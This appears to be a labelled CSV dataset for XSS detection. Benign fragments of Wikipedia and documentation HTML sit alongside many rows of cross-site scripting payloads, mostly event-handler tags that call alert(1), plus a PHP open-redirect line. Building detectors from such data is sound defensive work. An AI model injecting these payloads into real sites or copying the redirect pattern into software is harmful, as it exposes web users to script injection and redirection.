,kod,label
226,"<li><a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Koch, Christof </a>, ""Proust among the Machines"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 321, no. 6 (December 2019), pp.&#160;46–49. <a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Christof Koch </a> doubts the possibility of ""intelligent"" machines attaining <a href=""/wiki/Consciousness"" title=""Consciousness"">consciousness </a>, because ""[e]ven the most sophisticated <a href=""/wiki/Brain_simulation"" title=""Brain simulation"">brain simulations </a> are unlikely to produce conscious <a href=""/wiki/Feelings"" class=""mw-redirect"" title=""Feelings"">feelings </a>."" (p.&#160;48.) According to Koch, ""Whether machines can become <a href=""/wiki/Sentience"" title=""Sentience"">sentient </a> [is important] for <a href=""/wiki/Ethics"" title=""Ethics"">ethical </a> reasons. If computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. Per GNW [the <a href=""/wiki/Global_Workspace_Theory#Global_neuronal_workspace"" class=""mw-redirect"" title=""Global Workspace Theory"">Global Neuronal Workspace </a> theory], they turn from mere objects into subjects... with a <a href=""/wiki/Point_of_view_(philosophy)"" title=""Point of view (philosophy)"">point of view </a>.... Once computers' <a href=""/wiki/Cognitive_abilities"" class=""mw-redirect"" title=""Cognitive abilities"">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href=""/wiki/Rights"" title=""Rights"">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href=""/wiki/Pain"" title=""Pain"">pain </a> and degradation. The alternative, embodied by IIT [Integrated Information Theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself."" (p.&#160;49.) </li>",0
227,"<keygen onclick=""alert(1)"">test</keygen>",1
228,"<meter oncut=""alert(1)"" contenteditable>test</meter>",1
229,"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",1
230,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.bbc.com/news/technology-35785875"">""Artificial intelligence: Google's AlphaGo beats Go master Lee Se-dol"" </a>. <i>BBC News </i>. 12 March 2016. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160826103910/http://www.bbc.com/news/technology-35785875"">Archived </a> from the original on 26 August 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">1 October ",0
231,<strike onpointerover=alert(1)>XSS</strike>,1
232,"	 </span> ",0
233,"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",1
234,"<main onmousedown=""alert(1)"">test</main>",1
235,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1
236,</head>,0
237,"<command oncontextmenu=""alert(1)"">test</command>",1
238,"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationstart=""alert(1)""></title>",1
239,"<link onkeydown=""alert(1)"" contenteditable>test</link>",1
240,"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;430–435 </li>",0
241,<command onpointerover=alert(1)>XSS</command>,1
242,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Samuel, A. L. (July 1959). ""Some Studies in Machine Learning Using the Game of Checkers"". <i>IBM Journal of Research and Development </i>. <b>3 </b> (3): 210–229. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254"">10.1.1.368.2254 </a> ",0
243,<input id=x tabindex=1 onactivate=alert(1)></input>,1
244,"<tr onpaste=""alert(1)"" contenteditable>test</tr>",1
245, </li>,0
246,"<samp onmousemove=""alert(1)"">test</samp>",1
247,"<script onmousemove=""alert(1)"">test</script>",1
248,"<td onmouseenter=""alert(1)"">test</td>",1
249,"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",1
250,"<form draggable=""true"" ondragend=""alert(1)"">test</form>",1
251,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired+UK&amp;rft.atitle=The+UK+is+about+to+Start+Testing+Self-Driving+Truck+Platoons&amp;rft.date=2017-08-24&amp;rft.aulast=Burgess&amp;rft.aufirst=Matt&amp;rft_id=https%3A%2F%2Fwww.wired.co.uk%2Farticle%2Fuk-trial-self-driving-trucks-platoons-roads&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
252,"<div role=""navigation"" class=""navbox"" aria-labelledby=""Subfields_of_and_cyberneticians_involved_in_cybernetics"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0
253,"<iframe onmouseenter=""alert(1)"">test</iframe>",1
254,"<listing onkeydown=""alert(1)"" contenteditable>test</listing>",1
255,<svg><ol onload=alert(1)></ol>,1
256, </li>,0
257,"<base onmouseover=""alert(1)"">test</base>",1
258,"	 </span>",0
259,"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",1
260,"<dt><a class=""reference internal"" href=""topics/deploy.html""><span class=""doc"">Deploying Spiders",0
261,"	 </span>",0
262,"<keygen onmouseleave=""alert(1)"">test</keygen>",1
263,"<dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Hans Moravec </a>, <a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id=""cite_ref-Brain_simulation_153-1"" class=""reference""><a href=""#cite_note-Brain_simulation-153"">&#91;150&#93; </a> </sup> </dd> </dl>",0
264, </li>,0
265,<hr id=x tabindex=1 onactivate=alert(1)></hr>,1
266,"	 </span> </h3>",0
267,"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",1
268,<bdo onpointerdown=alert(1)>XSS</bdo>,1
269," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Software_development"" title=""Software development"">Software development </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
270,"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1
271,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
272,<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,1
273,"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>",1
274,<basefont onpointerup=alert(1)>XSS</basefont>,1
275,"<li id=""cite_note-378""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-378"">^ </a> </b> ",0
276,"<li>Try the <a class=""reference internal"" href=""faq.html""><span class=""doc"">FAQ",0
277,"<form ondblclick=""alert(1)"">test</form>",1
278,"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",0
279,"	 </span> <span class=""toctext"">Perception ",0
280,"<li id=""cite_note-Decision_tree-217""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Decision_tree_217-0"">^ </a> </b> ",0
281, </li>,0
282,<image srcset=1 onerror=alert(1)>,1
283,<address id=x tabindex=1 onactivate=alert(1)></address>,1
284,<tr onpointerup=alert(1)>XSS</tr>,1
285,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Smoliar, Stephen W.; Zhang, HongJiang (1994). ""Content based video indexing and retrieval"". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F93.311653"">10.1109/93.311653 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
286,<header id=x tabindex=1 onfocus=alert(1)></header>,1
287,"<li><a href=""/wiki/Computational_geometry"" title=""Computational geometry"">Computational geometry </a> </li> </ul>",0
288,"<track onmouseleave=""alert(1)"">test</track>",1
289,"	 </span> </li>",0
290,"<li><a href=""/wiki/Rudolf_Steiner"" title=""Rudolf Steiner"">Rudolf Steiner </a> </li>",0
291, </li>,0
292,"SRC=""http://ha.ckers.org/.swf"" AllowScriptAccess=""always""",1
293,"<content onmouseleave=""alert(1)"">test</content>",1
294,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
295,"<fieldset onmouseover=""alert(1)"">test</fieldset>",1
296,<tfoot onpointerup=alert(1)>XSS</tfoot>,1
297,"<figcaption oncut=""alert(1)"" contenteditable>test</figcaption>",1
298,"<span draggable=""true"" ondragend=""alert(1)"">test</span>",1
299,                latest,0
300,"<applet oncut=""alert(1)"" contenteditable>test</applet>",1
301,"		<a href=""/wiki/File:Kismet_robot_at_MIT_Museum.jpg"" class=""image"">",0
302,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft_id=https%3A%2F%2Fars.electronica.art%2Foutofthebox%2Fen%2Fdigital-humanism-conf%2F+Retrieved+September+2019&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
303,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",1
304,"	 </span>",0
305,"d=""alert('');\"")"";",1
306,"<li onmouseup=""alert(1)"">test</li>",1
307,          <dd>,0
308,"<button onmousedown=""alert(1)"">test</button>",1
309,"	 </span>",0
310, </li>,0
311,"	<span class=""mw-editsection-bracket"">] ",0
312,"<li id=""cite_note-393""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-393"">^ </a> </b> ",0
313,"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",1
314,<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,1
315," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Applied<br />computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
316,</dl>,0
317, </li>,0
318,"	<form action=""/w/index.php"" id=""searchform"">",0
319,"    <link rel=""search"" title=""Search"" href=""search.html"" />",0
320,"<li><a href=""/wiki/Gaussian_adaptation"" title=""Gaussian adaptation"">Gaussian adaptation </a> </li>",0
321,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",1
322,<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,1
323,<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1
324,<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,1
325,"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>",1
326,"<em onbeforepaste=""alert(1)"" contenteditable>test</em>",1
327,"<menu onkeyup=""alert(1)"" contenteditable>test</menu>",1
328,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=42"" title=""Edit section: Video games"">edit </a><span class=""mw-editsection-bracket"">] ",0
329,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/extensions.html"">Extensions</a></li>",0
330,"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",1
331,<style id=x tabindex=1 onactivate=alert(1)></style>,1
332,"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></u>",1
333,"<section onmouseover=""alert(1)"">test</section>",1
334,"<li><a href=""/wiki/Propositional_attitude"" title=""Propositional attitude"">Propositional attitude </a> </li>",0
335,"<title onmouseout=""alert(1)"">test</title>",1
336,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;863–898 </li>",0
337,<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,1
338,<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,1
339,"<acronym onmousemove=""alert(1)"">test</acronym>",1
340,<input onpointermove=alert(1)>XSS</input>,1
341,header('Location: '.$_GET['param']);,1
342,"	 </span> </h3>",0
343,"<slot oncontextmenu=""alert(1)"">test</slot>",1
344,"<li id=""cite_note-150""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-150"">^ </a> </b> ",0
345,"	 </span> 2015 ",0
346,"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",1
347,<div onpointerleave=alert(1)>XSS</div>,1
348,"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0
349,"			<img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x"" data-file-width=""2272"" data-file-height=""1704"" /> </a>  ",0
350,<svg><spacer onload=alert(1)></spacer>,1
351,"<li><a href=""/wiki/Electronic_design_automation"" title=""Electronic design automation"">Electronic design automation </a> </li>",0
352,"<nav oncopy=""alert(1)"" contenteditable>test</nav>",1
353,"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",0
354,"	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>",0
355,<applet onreadystatechange=alert(1)></applet>,1
356,"<h3><span id=""Machine_consciousness.2C_sentience_and_mind""> ",0
357,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
358,"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",1
359,"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",1
360,"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",0
361,<body onpointerover=alert(1)>XSS</body>,1
362,<track id=x tabindex=1 onfocusin=alert(1)></track>,1
363,"<div onmouseleave=""alert(1)"">test</div>",1
364,"<li id=""cite_note-guardian_jobs_debate-24""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-guardian_jobs_debate_24-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-guardian_jobs_debate_24-1""><sup><i><b>b </b> </i> </sup> </a> ",0
365,"	 </span> <span class=""toctext"">Motion and manipulation ",0
366,"<li onmousedown=""alert(1)"">test</li>",1
367,</ul>,0
368,<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>,1
369,<element onpointerenter=alert(1)>XSS</element>,1
370,<footer id=x tabindex=1 onactivate=alert(1)></footer>,1
371,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
372,"	 </span> 2018 ",0
373,"<thead draggable=""true"" ondragend=""alert(1)"">test</thead>",1
374,"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Gillick, Dan; Brunk, Cliff; Vinyals, Oriol; Subramanya, Amarnag (2015). ""Multilingual Language Processing From Bytes"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1512.00103"">1512.00103 </a> ",0
375,"	 </span></p>",0
376,"<li>Sun, R. &amp; Bookman, L. (eds.), <i>Computational Architectures: Integrating Neural and Symbolic Processes </i>. Kluwer Academic Publishers, Needham, MA. 1994. </li>",0
377,"<source draggable=""true"" ondragend=""alert(1)"">test</source>",1
378,"	 </span> </li>",0
379,<section id=x tabindex=1 onfocusin=alert(1)></section>,1
380,"<li><a href=""/wiki/Valentin_Turchin"" title=""Valentin Turchin"">Valentin Turchin </a> </li>",0
381,"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",1
382,"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",1
383, ,0
384,"	 <div style=""padding:0em 0.25em"">",0
385,"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",1
386,"<style>:target {transform: rotate(180deg);}</style><canvas id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></canvas>",1
387,"<details onkeydown=""alert(1)"" contenteditable>test</details>",1
388,      </dl>,0
389,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
390,<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1
391,<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,1
392,"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",1
393,"<font oncontextmenu=""alert(1)"">test</font>",1
394, </div> </td> </tr> </tbody> </table> </div>,0
395,<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>,1
396,"<table draggable=""true"" ondragenter=""alert(1)"">test</table>",1
397,"<big onmouseenter=""alert(1)"">test</big>",1
398,<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,1
399,<command onpointerleave=alert(1)>XSS</command>,1
400,"<thead onkeydown=""alert(1)"" contenteditable>test</thead>",1
401,"  <form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0
402,<abbr onpointermove=alert(1)>XSS</abbr>,1
403,<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,1
404,"<li id=""cite_note-3""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-3"">^ </a> </b> ",0
405,<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,1
406,"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",1
407,"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",1
408,"<strike onmouseenter=""alert(1)"">test</strike>",1
409,"	 </span> </a> </li>",0
410,<title onpointerenter=alert(1)>XSS</title>,1
411,<frameset onpointerup=alert(1)>XSS</frameset>,1
412,<svg><blockquote onload=alert(1)></blockquote>,1
413,"<menu ondblclick=""alert(1)"">test</menu>",1
414,"	 </span> </a> </i>&#93; </sup>. <a href=""/wiki/Google_AdSense"" title=""Google AdSense"">AdSense </a> uses a Bayesian network with over 300 million edges to learn which ads to serve.<sup id=""cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015chapter_6-212"">&#91;206&#93; </a> </sup>",0
415,<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,1
416,"<ul><li><a href=""/wiki/Philosophical_analysis"" title=""Philosophical analysis"">Analysis </a> </li>",0
417,<area id=x tabindex=1 onactivate=alert(1)></area>,1
418,<hr onpointerout=alert(1)>XSS</hr>,1
419,"<ul><li><a href=""#CITEREFHernandez-Orallo2000"">Hernandez-Orallo 2000 </a> </li>",0
420,"	<span class=""mw-headline"" id=""General_intelligence"">General intelligence ",0
421,"<li><a href=""/wiki/Real-time_computing"" title=""Real-time computing"">Real-time computing </a> </li>",0
422,"	 </span> <span class=""reference-text"">",0
423,<var onpointerleave=alert(1)>XSS</var>,1
424,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
425,"<dfn onmouseenter=""alert(1)"">test</dfn>",1
426,"<style>:target {transform: rotate(180deg);}</style><dir id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dir>",1
427,"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>",1
428,"	 </span> 2016 ",0
429,"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.artint.2010.09.006"">10.1016/j.artint.2010.09.006 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence&amp;rft.atitle=Measuring+Universal+Intelligence%3A+Towards+an+Anytime+Intelligence+Test&amp;rft.volume=174&amp;rft.issue=18&amp;rft.pages=1508-1539&amp;rft.date=2010&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.295.9079&amp;rft_id=info%3Adoi%2F10.1016%2Fj.artint.2010.09.006&amp;rft.aulast=Hernandez-Orallo&amp;rft.aufirst=J.&amp;rft.au=Dowe%2C+D.+L.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
430,"<param onmousemove=""alert(1)"">test</param>",1
431,<var onpointerup=alert(1)>XSS</var>,1
432,"<bdi onmousedown=""alert(1)"">test</bdi>",1
433,"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",1
434,"<a href=""/wiki/Cyc"" title=""Cyc"">Cyc </a>:",0
435,"	 <div>",0
436,"	 </span>",0
437,"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",1
438,"	 </span>",0
439,"<li id=""cite_note-Hegemony_of_the_Dartmouth_conference_attendees-33""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Hegemony_of_the_Dartmouth_conference_attendees_33-0"">^ </a> </b> ",0
440,"<a href=""/wiki/Applied_information_economics"" title=""Applied information economics"">Information value theory </a>:",0
441,"<li><a href=""/wiki/Larry_Laudan"" title=""Larry Laudan"">Larry Laudan </a> </li>",0
442,<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>,1
443,"<style>:target {transform: rotate(180deg);}</style><param id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></param>",1
444,<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,1
445,<svg><legend onload=alert(1)></legend>,1
446,"			<div class=""after-portlet after-portlet-lang""><span class=""wb-langlinks-edit wb-langlinks-link""><a href=""https://www.wikidata.org/wiki/Special:EntityPage/Q11660#sitelinks-wikipedia"" title=""Edit interlanguage links"" class=""wbc-editpage"">Edit links </a> ",0
447,"<style>:target {color:red;}</style><textarea id=x style=""transition:color 1s"" ontransitionend=alert(1)></textarea>",1
448,"	 </span> </a> </li>",0
449,<object onpointerleave=alert(1)>XSS</object>,1
450,<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,1
451,"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;301–318 </li> </ul>",0
452,"	 </span> </sup> possibly involving <a href=""/wiki/Reinforcement_learning#Inverse_reinforcement_learning"" title=""Reinforcement learning"">inverse reinforcement learning </a>.<sup id=""cite_ref-HC_369-1"" class=""reference""><a href=""#cite_note-HC-369"">&#91;358&#93; </a> </sup><sup class=""reference"" style=""white-space:nowrap;"">:<span>191-193 ",0
453,"<li><a href=""/wiki/Adam_Tooze"" title=""Adam Tooze"">Tooze, Adam </a>, ""Democracy and Its Discontents"", <i><a href=""/wiki/The_New_York_Review_of_Books"" title=""The New York Review of Books"">The New York Review of Books </a> </i>, vol. LXVI, no. 10 (6 June 2019), pp.&#160;52–53, 56–57.  ""Democracy has no clear answer for the mindless operation of <a href=""/wiki/Bureaucracy"" title=""Bureaucracy"">bureaucratic </a> and <a href=""/wiki/Technology"" title=""Technology"">technological power </a>.  We may indeed be witnessing its extension in the form of artificial intelligence and <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>.  Likewise, after decades of dire warning, the <a href=""/wiki/Environmentalism"" title=""Environmentalism"">environmental problem </a> remains fundamentally unaddressed.... Bureaucratic overreach and environmental catastrophe are precisely the kinds of slow-moving existential challenges that democracies deal with very badly.... Finally, there is the threat du jour:  <a href=""/wiki/Corporation"" title=""Corporation"">corporations </a> and the technologies they promote.""  (pp.&#160;56–57.) </li> </ul>",0
454,"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",1
455,"<tt onkeypress=""alert(1)"" contenteditable>test</tt>",1
456,[1].find(alert),1
457,"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:%C3%84%C3%A4retuvastuse_n%C3%A4ide.png"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/2/20/%C3%84%C3%A4retuvastuse_n%C3%A4ide.png/220px-%C3%84%C3%A4retuvastuse_n%C3%A4ide.png"" decoding=""async"" width=""220"" height=""73"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/2/20/%C3%84%C3%A4retuvastuse_n%C3%A4ide.png/330px-%C3%84%C3%A4retuvastuse_n%C3%A4ide.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/2/20/%C3%84%C3%A4retuvastuse_n%C3%A4ide.png/440px-%C3%84%C3%A4retuvastuse_n%C3%A4ide.png 2x"" data-file-width=""1415"" data-file-height=""471"" /> </a>  <div class=""thumbcaption"">",0
